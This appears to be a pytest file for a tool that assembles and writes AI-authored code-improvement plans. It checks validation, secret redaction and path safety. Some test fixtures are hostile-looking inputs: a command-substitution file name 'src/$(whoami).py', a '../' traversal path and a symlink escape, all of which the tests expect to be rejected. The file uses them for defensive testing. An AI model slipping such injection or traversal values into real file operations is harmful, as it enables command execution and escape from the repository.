    raw_plan = deepcopy(plan)

    result = write_plans(
        repo / "daydream_plans",
        [{"finding": _finding(), **_assembled(repo, plan)}],
        planned_at=sha,
    )

    assert len(result["written"]) == 1
    assert plan == raw_plan
    text = (repo / "daydream_plans/001-batch-catalog-queries.md").read_text()
    assert (
        "def list_catalog():\n"
        "    return [load_item(item_id) for item_id in item_ids]"
    ) in text
    assert "WRONG stray model text" not in text


def test_stray_markdown_key_is_stripped_and_plan_writes(
    tmp_path: Path,
) -> None:
    repo, sha = _repo(tmp_path)
    plan = _authored_plan()
    plan["markdown"] = "## Steps\n\nTOKEN=super-secret-value"

    result = write_plans(
        repo / "daydream_plans",
        [{"finding": _finding(), **_assembled(repo, plan)}],
        planned_at=sha,
    )

    assert len(result["written"]) == 1
    for artifact in (repo / "daydream_plans").iterdir():
        assert "super-secret-value" not in artifact.read_text(encoding="utf-8")


def test_mixed_batch_writes_valid_sibling_and_blocks_invalid_sibling(
    tmp_path: Path,
) -> None:
    repo, sha = _repo(tmp_path)
    invalid = _authored_plan(slug="invalid-catalog-plan")
    invalid["test_plan"]["cases"] = []
    issues = _issues(repo, invalid)

    result = write_plans(
        repo / "daydream_plans",
        [
            {"finding": _finding(), **_assembled(repo)},
            _authoring_failure_selection(issues, fingerprint="fp-invalid"),
        ],
        planned_at=sha,
    )

    assert len(result["written"]) == 1
    assert len(result["failed"]) == 1
    assert [path.name for path in (repo / "daydream_plans").glob("0*.md")] == [
        "001-batch-catalog-queries.md"
    ]
    index = (repo / "daydream_plans/README.md").read_text()
    assert "| TODO |" in index
    assert "BLOCKED (PLAN_VALIDATION_FAILED: AUTHOR_SCHEMA_INVALID" in index


def test_planned_at_from_an_unrelated_root_is_rejected(tmp_path: Path) -> None:
    repo, original_root = _repo(tmp_path)
    assembled = _assembled(repo)
    tree = _git(repo, "rev-parse", "HEAD^{tree}")
    unrelated_root = _git(
        repo,
        "commit-tree",
        tree,
        "-m",
        "unrelated root with the same tree",
    )
    _git(repo, "checkout", "--detach", unrelated_root)

    result = write_plans(
        repo / "daydream_plans",
        [{"finding": _finding(), **assembled}],
        planned_at=original_root,
    )

    assert result["written"] == []
    assert "PLANNED_AT_NOT_ANCESTOR" in (
        repo / "daydream_plans/README.md"
    ).read_text()


def test_head_change_after_planning_blocks_stale_todo(tmp_path: Path) -> None:
    repo, planned_at = _repo(tmp_path)
    assembled = _assembled(repo)
    (repo / "README.md").write_text(
        "# Catalog service\n\nConcurrent branch update.\n",
        encoding="utf-8",
    )
    _git(repo, "add", "README.md")
    _git(repo, "commit", "-m", "advance head after plan fan-out")

    result = write_plans(
        repo / "daydream_plans",
        [{"finding": _finding(), **assembled}],
        planned_at=planned_at,
    )

    assert result["written"] == []
    assert not list((repo / "daydream_plans").glob("[0-9][0-9][0-9]-*.md"))
    assert "PLAN_HEAD_CHANGED" in (
        repo / "daydream_plans/README.md"
    ).read_text()


@pytest.mark.parametrize(
    "status",
    [
        "TODO",
        "IN PROGRESS",
        "DONE",
        "BLOCKED (tests failed after three executor attempts)",
    ],
)
def test_valid_linked_plan_is_preserved_for_every_executor_status(
    tmp_path: Path,
    status: str,
) -> None:
    repo, sha = _repo(tmp_path)
    plans_dir = repo / "daydream_plans"
    selection = _selection(repo)
    write_plans(plans_dir, [selection], planned_at=sha)
    index_path = plans_dir / "README.md"
    index_path.write_text(
        index_path.read_text().replace("| TODO |", f"| {status} |"),
        encoding="utf-8",
    )

    result = write_plans(plans_dir, [selection], planned_at=sha)

    assert result["written"] == []
    assert len(result["skipped"]) == 1
    assert planned_fingerprints(plans_dir) == {"fp-fix-n-plus-one"}
    assert [path.name for path in plans_dir.glob("[0-9][0-9][0-9]-*.md")] == [
        "001-batch-catalog-queries.md"
    ]
    index = index_path.read_text()
    assert index.count("fingerprint:fp-fix-n-plus-one") == 1
    assert f"| {status} |" in index


@pytest.mark.parametrize("failure_kind", ["transport", "validation"])
def test_host_blocked_attempt_reuses_reserved_number_when_retry_succeeds(
    tmp_path: Path,
    failure_kind: str,
) -> None:
    repo, sha = _repo(tmp_path)
    plans_dir = repo / "daydream_plans"
    if failure_kind == "transport":
        failed_selection = {
            "finding": _finding(),
            "_attempt": {
                "transport_error_code": "NO_STRUCTURED_OBJECT",
                "received_result": None,
            },
            "error": True,
        }
    else:
        invalid = _authored_plan()
        invalid["test_plan"]["cases"] = []
        failed_selection = _authoring_failure_selection(_issues(repo, invalid))

    failed = write_plans(plans_dir, [failed_selection], planned_at=sha)
    failed_index = (plans_dir / "README.md").read_text()
    expected_failure_status = (
        "PLAN_WRITER_FAILED"
        if failure_kind == "transport"
        else "PLAN_VALIDATION_FAILED"
    )
    assert expected_failure_status in failed_index
    assert failed_index.count("fingerprint:fp-fix-n-plus-one") == 1
    assert planned_fingerprints(plans_dir) == set()
    assert not list(plans_dir.glob("[0-9][0-9][0-9]-*.md"))

    retried = write_plans(
        plans_dir,
        [{"finding": _finding(), **_assembled(repo)}],
        planned_at=sha,
    )
    unrelated = write_plans(
        plans_dir,
        [
            {
                "finding": _finding(fingerprint="fp-observability"),
                **_assembled(
                    repo, _authored_plan(slug="catalog-observability")
                ),
            }
        ],
        planned_at=sha,
    )

    assert failed["written"] == []
    assert [entry["number"] for entry in retried["written"]] == [1]
    assert [entry["number"] for entry in unrelated["written"]] == [2]
    assert sorted(
        path.name for path in plans_dir.glob("[0-9][0-9][0-9]-*.md")
    ) == [
        "001-batch-catalog-queries.md",
        "002-catalog-observability.md",
    ]
    index = (plans_dir / "README.md").read_text()
    assert index.count("fingerprint:fp-fix-n-plus-one") == 1
    assert "PLAN_WRITER_FAILED" not in index
    assert "PLAN_VALIDATION_FAILED" not in index


def test_rejected_index_status_is_preserved_and_not_retried(
    tmp_path: Path,
) -> None:
    repo, sha = _repo(tmp_path)
    plans_dir = repo / "daydream_plans"
    plans_dir.mkdir()
    index_path = plans_dir / "README.md"
    rejected_row = (
        "| 001 <!-- fingerprint:fp-fix-n-plus-one --> | "
        "Fix N+1 catalog queries | P2 | M | "
        "REJECTED (superseded by repository evidence) |"
    )
    index_path.write_text(
        "# Implementation Plans\n\n"
        "## Execution order & status\n\n"
        "| Plan | Title | Priority | Effort | Status |\n"
        "|------|-------|----------|--------|--------|\n"
        f"{rejected_row}\n",
        encoding="utf-8",
    )

    result = write_plans(plans_dir, [_selection(repo)], planned_at=sha)

    assert result["written"] == []
    assert len(result["skipped"]) == 1
    assert index_path.read_text().count(rejected_row) == 1
    assert not list(plans_dir.glob("[0-9][0-9][0-9]-*.md"))


def test_attempt_diagnostics_distinguish_failure_stages_and_success(
    tmp_path: Path,
) -> None:
    repo, sha = _repo(tmp_path)
    authoring_invalid = _authored_plan(slug="authoring-invalid-plan")
    authoring_invalid["title"] = "Too short"

    selections = [
        {
            "finding": _finding(fingerprint="fp-transport"),
            "_attempt": {
                "descriptor": "plan-transport",
                "backend": "FakeBackend",
                "model": "fake-model",
                "received_result": None,
                "transport_error_code": "NO_STRUCTURED_OBJECT",
            },
            "error": True,
        },
        _authoring_failure_selection(
            _issues(repo, authoring_invalid),
            fingerprint="fp-authoring",
        ),
        {
            "finding": _finding(fingerprint="fp-success"),
            **_assembled(repo, _authored_plan(slug="successful-plan")),
        },
    ]

    result = write_plans(
        repo / "daydream_plans",
        selections,
        planned_at=sha,
    )

    diagnostics = {
        attempt["finding"]["fingerprint"]: attempt
        for attempt in result["diagnostics"]
    }
    assert {
        fingerprint: (attempt["stage"], attempt["disposition"])
        for fingerprint, attempt in diagnostics.items()
    } == {
        "fp-transport": ("transport", "blocked"),
        "fp-authoring": ("authoring", "blocked"),
        "fp-success": ("success", "success"),
    }
    assert diagnostics["fp-transport"]["validation_errors"] == [
        {"code": "NO_STRUCTURED_OBJECT", "pointer": "/"}
    ]
    assert diagnostics["fp-authoring"]["validation_errors"] == [
        {
            "code": "AUTHOR_SCHEMA_INVALID",
            "pointer": "/title",
            "detail": "minLength=12;actual=9",
        }
    ]
    assert diagnostics["fp-success"]["artifact"]["path"].endswith(
        "-successful-plan.md"
    )
    index = (repo / "daydream_plans/README.md").read_text()
    assert "BLOCKED (PLAN_VALIDATION_FAILED: AUTHOR_SCHEMA_INVALID)" in index


def test_load_rejections_returns_empty_for_absent_or_malformed_file(
    tmp_path: Path,
) -> None:
    plans_dir = tmp_path / "daydream_plans"
    assert load_rejections(plans_dir) == {}

    plans_dir.mkdir()
    (plans_dir / "rejected.json").write_text("{not json")
    assert load_rejections(plans_dir) == {}


def test_record_rejections_appends_and_loads_by_fingerprint(
    tmp_path: Path,
) -> None:
    plans_dir = tmp_path / "daydream_plans"
    first = {
        "fingerprint": "abc",
        "title": "Phantom N+1",
        "path": "apps/catalog/api.py",
        "reason": "No query loop exists.",
        "rejected_at_sha": "123",
    }
    second = {
        "fingerprint": "def",
        "title": "By-design behavior",
        "path": "apps/billing/api.py",
        "reason": "Documented behavior.",
        "rejected_at_sha": "456",
    }

    record_rejections(plans_dir, [first])
    record_rejections(plans_dir, [second])

    assert load_rejections(plans_dir) == {"abc": first, "def": second}
    envelope = json.loads((plans_dir / "rejected.json").read_text())
    assert envelope == {
        "schema_version": 1,
        "rejected": [first, second],
    }


def test_overlong_authored_prose_is_clamped_during_normalization(
    tmp_path: Path,
) -> None:
    repo, sha = _repo(tmp_path)
    plan = _authored_plan()
    plan["scope"]["existing_paths"][0]["role"] = "S" * 306
    plan["why_this_matters"]["problem"] = "P" * 810

    assembled = _assembled(repo, plan)

    role = assembled["scope"]["existing_paths"][0]["role"]
    assert len(role) == 300
    assert role == "S" * 299 + "…"
    problem = assembled["why_this_matters"]["problem"]
    assert len(problem) == 800
    assert problem == "P" * 799 + "…"


def test_unclamped_overlong_title_is_an_issue_with_max_length_detail(
    tmp_path: Path,
) -> None:
    repo, _ = _repo(tmp_path)
    plan = _authored_plan()
    plan["title"] = "T" * 170

    issues = _issues(repo, plan)

    assert [
        (issue.code, issue.pointer, issue.detail) for issue in issues
    ] == [("AUTHOR_SCHEMA_INVALID", "/title", "maxLength=160;actual=170")]
    assert issues[0].hint is not None
    assert "at most 160 characters (it has 170)" in issues[0].hint


def test_min_length_violation_issue_carries_detail_segment(
    tmp_path: Path,
) -> None:
    repo, _ = _repo(tmp_path)
    plan = _authored_plan()
    plan["why_this_matters"]["problem"] = ""

    issues = _issues(repo, plan)

    assert [
        (issue.code, issue.pointer, issue.detail) for issue in issues
    ] == [
        (
            "AUTHOR_SCHEMA_INVALID",
            "/why_this_matters/problem",
            "minLength=30;actual=0",
        )
    ]


@pytest.mark.parametrize(
    "prose",
    [
        "Callers must send X-Internal-Service-Secret: <internalSecret> on every request.",
        "Callers must send X-Internal-Service-Secret: ${INTERNAL_SECRET} on every request.",
        "The deploy script reads secret: $SECRET from the environment at startup.",
        "The fixture configures secret: test-secret for the local integration suite.",
    ],
)
def test_secret_placeholder_prose_survives_normalization_unchanged(
    tmp_path: Path,
    prose: str,
) -> None:
    repo, _ = _repo(tmp_path)
    plan = _authored_plan()
    plan["why_this_matters"]["problem"] = prose

    assembled = _assembled(repo, plan)

    assert assembled["why_this_matters"]["problem"] == prose


def test_secret_literal_value_is_redacted_and_never_reaches_artifacts(
    tmp_path: Path,
) -> None:
    repo, sha = _repo(tmp_path)
    plan = _authored_plan()
    plan["why_this_matters"]["problem"] = (
        "The bootstrap script hardcodes secret: hunter2realvalue in cleartext."
    )

    assembled = _assembled(repo, plan)
    result = write_plans(
        repo / "daydream_plans",
        [{"finding": _finding(), **assembled}],
        planned_at=sha,
    )

    assert assembled["why_this_matters"]["problem"] == (
        "The bootstrap script hardcodes secret: <redacted> in cleartext."
    )
    assert "hunter2realvalue" not in json.dumps(assembled)
    assert len(result["written"]) == 1
    plan_text = (
        repo / "daydream_plans/001-batch-catalog-queries.md"
    ).read_text()
    assert "<redacted>" in plan_text
    for artifact in (repo / "daydream_plans").iterdir():
        assert "hunter2realvalue" not in artifact.read_text(encoding="utf-8")


def test_underscored_secret_key_name_is_redacted_in_quoted_source(
    tmp_path: Path,
) -> None:
    """``aws_secret_access_key`` is a key name, not the bare word ``secret``.

    A word-boundary match never fired inside it, so a live AWS key reached the
    plan file: ``trajectory.redact_text`` does not match this shape either.
    """
    repo, sha = _repo(tmp_path)
    (repo / "apps/catalog/api.py").write_text(
        'aws_secret_access_key = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"\n'
        "    return [load_item(item_id) for item_id in item_ids]\n",
        encoding="utf-8",
    )

    assembled = _assembled(repo)
    result = write_plans(
        repo / "daydream_plans",
        [{"finding": _finding(), **assembled}],
        planned_at=sha,
    )

    excerpt = next(
        item
        for item in assembled["current_state_excerpts"]
        if item["path"] == "apps/catalog/api.py"
    )
    assert excerpt["verbatim_excerpt"].startswith(
        "aws_secret_access_key = <redacted>"
    )
    assert len(result["written"]) == 1
    for artifact in (repo / "daydream_plans").iterdir():
        assert "wJalrXUtnFEMI" not in artifact.read_text(encoding="utf-8")


@pytest.mark.parametrize(
    "prose",
    [
        "The tokenizer: sentencepiece choice stays as the repository has it.",
        "The passwordless: true flag in the fixture config stays untouched.",
    ],
)
def test_secret_shaped_word_prefixes_are_not_treated_as_key_names(
    tmp_path: Path,
    prose: str,
) -> None:
    """Segment anchoring: ``tokenizer`` is not a ``token`` key."""
    repo, _ = _repo(tmp_path)
    plan = _authored_plan()
    plan["why_this_matters"]["problem"] = prose

    assembled = _assembled(repo, plan)

    assert assembled["why_this_matters"]["problem"] == prose


def test_assemble_reports_every_issue_at_once_with_pointers_and_hints(
    tmp_path: Path,
) -> None:
    repo, _ = _repo(tmp_path)
    plan = _authored_plan()
    plan["title"] = "Too short"
    plan["steps"][0]["verification"]["recon_command_id"] = "make-tests"
    plan["steps"][0]["changes"][0]["path"] = "README.md"

    issues = _issues(repo, plan)

    by_code = {issue.code: issue for issue in issues}
    assert len(issues) == 3
    assert by_code["AUTHOR_SCHEMA_INVALID"].pointer == "/title"
    assert by_code["AUTHOR_SCHEMA_INVALID"].detail == "minLength=12;actual=9"
    assert (
        by_code["STEP_PATH_OUT_OF_SCOPE"].pointer == "/steps/0/changes/0/path"
    )
    assert by_code["STEP_PATH_OUT_OF_SCOPE"].hint is not None
    assert "apps/catalog/api.py" in by_code["STEP_PATH_OUT_OF_SCOPE"].hint
    unknown = by_code["RECON_COMMAND_UNKNOWN"]
    assert unknown.pointer == "/steps/0/verification/recon_command_id"
    assert unknown.hint == "valid recon command ids: test-suite, git-diff"


def test_assemble_numbers_steps_and_done_criteria_and_injects_mandatory_kinds(
    tmp_path: Path,
) -> None:
    repo, _ = _repo(tmp_path)
    plan = _authored_plan()
    plan["steps"].append(
        {
            "title": "Harden the catalog regression coverage",
            "changes": [
                {
                    "path": "tests/test_catalog.py",
                    "symbol": "test_list_catalog_returns_items",
                    "operation": "modify",
                    "instruction": (
                        "Extend the existing regression to cover an empty catalog."
                    ),
                    "target_state": (
                        "The regression suite also proves empty-catalog behavior."
                    ),
                }
            ],
            "verification": None,
        }
    )

    assembled = _assembled(repo, plan)

    assert [(step["id"], step["order"]) for step in assembled["steps"]] == [
        ("step-1", 1),
        ("step-2", 2),
    ]
    criteria = assembled["done_criteria"]
    assert [criterion["id"] for criterion in criteria] == [
        "done-1",
        "done-2",
        "done-3",
    ]
    assert [criterion["kind"] for criterion in criteria] == [
        "behavior",
        "test-gate",
        "scope-integrity",
    ]
    assert "test_list_catalog_batches_item_loading" in criteria[1]["description"]
    assert "apps/catalog/api.py" in criteria[2]["description"]


def test_assemble_templates_three_boilerplate_stop_conditions_plus_false_assumption(
    tmp_path: Path,
) -> None:
    repo, _ = _repo(tmp_path)
    plan = _authored_plan()
    plan["additional_stop_conditions"] = [
        {
            "kind": "environment",
            "condition": (
                "The catalog test database is unavailable in this environment."
            ),
            "evidence_to_report": "Report the connection error and the database host.",
            "related_paths": ["tests/test_catalog.py"],
            "related_step_numbers": [1],
        }
    ]

    assembled = _assembled(repo, plan)

    conditions = assembled["stop_conditions"]
    assert [condition["kind"] for condition in conditions] == [
        "drift",
        "repeated-verification-failure",
        "out-of-scope-change",
        "false-assumption",
        "environment",
    ]
    assert all(
        condition["required_action"] == "STOP_AND_REPORT"
        for condition in conditions
    )
    false_assumption = conditions[3]
    assert false_assumption["condition"] == (
        "The load_item interface cannot accept multiple catalog identifiers."
    )
    assert false_assumption["related_step_ids"] == ["step-1"]
    assert conditions[0]["related_paths"] == [
        "apps/catalog/api.py",
        "tests/test_catalog.py",
    ]
    assert conditions[4]["related_step_ids"] == ["step-1"]


def test_assemble_clamps_excerpt_end_line_but_rejects_start_beyond_eof(
    tmp_path: Path,
) -> None:
    repo, _ = _repo(tmp_path)
    clamped = _authored_plan()
    clamped["scope"]["existing_paths"][0]["excerpts"] = [
        {"start_line": 1, "end_line": 200}
    ]

    assembled = _assembled(repo, clamped)

    anchor = assembled["current_state_excerpts"][0]["line_anchor"]
    assert anchor == {"start_line": 1, "end_line": 2}
    assert assembled["current_state_excerpts"][0]["verbatim_excerpt"] == (
        "def list_catalog():\n"
        "    return [load_item(item_id) for item_id in item_ids]"
    )

    beyond = _authored_plan()
    beyond["scope"]["existing_paths"][0]["excerpts"] = [
        {"start_line": 50, "end_line": 60}
    ]
    issues = _issues(repo, beyond)
    assert [
        (issue.code, issue.pointer, issue.detail)
        for issue in issues
        if issue.code == "EXCERPT_ANCHOR_INVALID"
    ] == [
        (
            "EXCERPT_ANCHOR_INVALID",
            "/scope/existing_paths/0/excerpts/0",
            "lines=2",
        )
    ]


def test_repository_secrets_are_redacted_not_blocked_in_excerpts(
    tmp_path: Path,
) -> None:
    """Repository bytes are spliced into excerpts after authored-string
    redaction has already run, so both splice points must redact them.

    The secret shape here is lowercase on purpose: ``trajectory.redact_text``
    does not match it, so only the improve-side redaction can catch it.
    """
    repo, sha = _repo(tmp_path)
    (repo / "apps/catalog/api.py").write_text(
        '    password = "s3cr3tplaintext"\n'
        "    return [load_item(item_id) for item_id in item_ids]\n",
        encoding="utf-8",
    )

    assembled = _assembled(repo)

    excerpt = next(
        item
        for item in assembled["current_state_excerpts"]
        if item["path"] == "apps/catalog/api.py"
    )
    assert excerpt["verbatim_excerpt"] == (
        "    password = <redacted>\n"
        "    return [load_item(item_id) for item_id in item_ids]"
    )
    assert "s3cr3tplaintext" not in json.dumps(assembled)


def test_assemble_dedups_scope_lists_by_disk_truth(tmp_path: Path) -> None:
    repo, _ = _repo(tmp_path)
    plan = _authored_new_file_plan()
    plan["scope"]["existing_paths"].append(
        dict(plan["scope"]["existing_paths"][0])
    )
    plan["scope"]["new_paths"].append(
        {
            "path": "apps/catalog/api.py",
            "role": "Wrongly re-declared as new although it exists on disk.",
        }
    )
    plan["scope"]["new_paths"].append(
        {
            "path": "tests/test_catalog_batching.py",
            "role": "Duplicate new-path entry that must collapse to one.",
        }
    )
    plan["scope"]["out_of_scope_paths"].append(
        {
            "path": "apps/catalog/api.py",
            "reason": "Conflicts with the in-scope declaration and is dropped.",
        }
    )

    assembled = _assembled(repo, plan)

    scope = assembled["scope"]
    assert [entry["path"] for entry in scope["existing_paths"]] == [
        "apps/catalog/api.py",
        "tests/test_catalog.py",
    ]
    assert [entry["path"] for entry in scope["new_paths"]] == [
        "tests/test_catalog_batching.py"
    ]
    assert [entry["path"] for entry in scope["out_of_scope_paths"]] == [
        "README.md"
    ]


def _stop_condition(*related_paths: str) -> dict[str, Any]:
    return {
        "kind": "environment",
        "condition": (
            "The retired catalog loader module is still present on disk when "
            "you start this plan."
        ),
        "evidence_to_report": "Report the module path and its current contents.",
        "related_paths": list(related_paths),
        "related_step_numbers": [1],
    }


def _injected_out_of_scope(assembled: dict[str, Any], path: str) -> dict[str, Any]:
    entries = [
        entry
        for entry in assembled["scope"]["out_of_scope_paths"]
        if entry["path"] == path
    ]
    assert len(entries) == 1
    return entries[0]


def test_undeclared_stop_path_is_declared_out_of_scope_not_blocked(
    tmp_path: Path,
) -> None:
    repo, _ = _repo(tmp_path)
    plan = _authored_plan()
    plan["false_assumption"]["related_paths"] = [
        "apps/catalog/api.py",
        "Makefile",
    ]

    assembled = _assembled(repo, plan)

    entry = _injected_out_of_scope(assembled, "Makefile")
    assert entry["reason"] == (
        "Referenced by a stop condition for context only; do not create, "
        "modify, or depend on this path."
    )
    assert [entry["path"] for entry in assembled["scope"]["out_of_scope_paths"]] == [
        "README.md",
        "Makefile",
    ]
    assert assembled["stop_conditions"][3]["related_paths"] == [
        "apps/catalog/api.py",
        "Makefile",
    ]


def test_deleted_stop_path_is_declared_out_of_scope_without_touching_disk(
    tmp_path: Path,
) -> None:
    repo, _ = _repo(tmp_path)
    deleted = "apps/catalog/legacy_loader.py"
    plan = _authored_plan()
    plan["additional_stop_conditions"] = [_stop_condition(deleted)]

    assembled = _assembled(repo, plan)

    assert _injected_out_of_scope(assembled, deleted)["path"] == deleted
    assert not (repo / deleted).exists()
    assert assembled["stop_conditions"][4]["related_paths"] == [deleted]


@pytest.mark.parametrize("path", ["../outside.py", "src/$(whoami).py"])
def test_malformed_stop_path_stays_blocked_and_is_never_declared(
    tmp_path: Path,
    path: str,
) -> None:
    repo, _ = _repo(tmp_path)
    plan = _authored_plan()
    plan["additional_stop_conditions"] = [_stop_condition(path)]

    issues = _issues(repo, plan)

    assert "MALFORMED_PATH" in {issue.code for issue in issues}
    assert plan["scope"]["out_of_scope_paths"] == [
        {
            "path": "README.md",
            "reason": "Catalog batching does not change user documentation.",
        }
    ]


def test_out_of_repository_stop_path_stays_blocked_and_is_never_declared(
    tmp_path: Path,
) -> None:
    repo, _ = _repo(tmp_path)
    outside = tmp_path / "outside"
    outside.mkdir()
    (repo / "escape").symlink_to(outside, target_is_directory=True)
    plan = _authored_plan()
    plan["additional_stop_conditions"] = [_stop_condition("escape/pwn.py")]

    issues = _issues(repo, plan)

    assert "PATH_OUTSIDE_REPOSITORY" in {issue.code for issue in issues}
    assert [
        issue.pointer
        for issue in issues
        if issue.code == "PATH_OUTSIDE_REPOSITORY"
    ] == ["/additional_stop_conditions/0/related_paths/0"]


def test_already_declared_stop_paths_are_never_duplicated(tmp_path: Path) -> None:
    repo, _ = _repo(tmp_path)
    plan = _authored_plan()
    plan["additional_stop_conditions"] = [
        _stop_condition("README.md", "tests/test_catalog.py", "README.md")
    ]

    assembled = _assembled(repo, plan)

    assert assembled["scope"]["out_of_scope_paths"] == [
        {
            "path": "README.md",
            "reason": "Catalog batching does not change user documentation.",
        }
    ]


def test_injected_out_of_scope_entry_satisfies_the_authoring_schema(
    tmp_path: Path,
) -> None:
    repo, _ = _repo(tmp_path)
    plan = _authored_plan()
    plan["false_assumption"]["related_paths"] = ["Makefile"]

    assembled = _assembled(repo, plan)

    entry = _injected_out_of_scope(assembled, "Makefile")
    item_schema = PLAN_AUTHOR_SCHEMA["properties"]["scope"]["properties"][
        "out_of_scope_paths"
    ]["items"]
    assert not list(Draft202012Validator(item_schema).iter_errors(entry))
    assert 20 <= len(entry["reason"]) <= 500


def test_repair_prompt_renders_complete_issue_list_with_hints() -> None:
    prompt = build_plan_writer_repair_prompt(
        "original writer prompt",
        [
            AssemblyIssue(
                "AUTHOR_SCHEMA_INVALID",
                "/title",
                "minLength=12;actual=9",
                (
                    "Rewrite the value at this pointer to at least 12 "
                    "characters (it has 9); keep every other field unchanged "
                    "in meaning."
                ),
            ),
            AssemblyIssue(
                "RECON_COMMAND_UNKNOWN",
                "/steps/0/verification/recon_command_id",
                None,
                "valid recon command ids: test-suite, git-diff",
            ),
        ],
    )

    assert prompt.startswith("original writer prompt")
    assert "AUTHOR_SCHEMA_INVALID" in prompt
    assert "/title" in prompt
    assert "minLength=12;actual=9" in prompt
    assert "at least 12 characters (it has 9)" in prompt
    assert "RECON_COMMAND_UNKNOWN" in prompt
    assert "/steps/0/verification/recon_command_id" in prompt
    assert "valid recon command ids: test-suite, git-diff" in prompt
    assert "complete replacement object" in prompt


def test_repair_prompt_drops_malformed_detail_segment() -> None:
    prompt = build_plan_writer_repair_prompt(
        "original writer prompt",
        [AssemblyIssue("AUTHOR_SCHEMA_INVALID", "/x", "bad,stuff!")],
    )

    assert "/x" in prompt
    assert "bad,stuff!" not in prompt
    assert '"detail"' not in prompt
